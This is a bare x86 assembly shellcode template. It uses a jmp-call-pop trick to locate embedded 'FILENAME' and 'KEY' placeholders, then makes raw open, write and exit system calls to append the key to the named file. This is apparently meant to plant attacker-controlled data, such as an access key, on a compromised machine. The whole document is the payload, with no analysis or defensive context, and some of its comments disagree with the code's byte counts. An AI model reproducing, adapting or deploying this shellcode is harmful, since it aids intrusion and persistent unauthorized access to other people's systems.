# eax, ecx = temporary
# edx = fd


jmp data_path
thestart1:

popl %ebx           ## ebx = filepath
movl %ebx, %esi     
addl $0xaa, %esi    ## filename length

xorl %eax, %eax
movw $1025, %ax
push %eax
push %ebx        ##file path
push %ebx        ##dummy
xorl %eax, %eax
movb $5, %al
int $0x80
movl %eax, %edx

######## edx=open (filepath, 1, 0)

xorl %eax, %eax
movb $0xee, %al
push %eax        ## 32 bytes
push %esi        ## buff
movl %edx, %eax  ## write to the file
push %eax
push %eax        ## dummy
movb $4, %al
int $0x80
######## write (edx, esi, 32)

movb $1, %al
int $0x80
######## exit()

data_path:
call thestart1
.ascii "FILENAME\0"
.ascii "KEY\0"

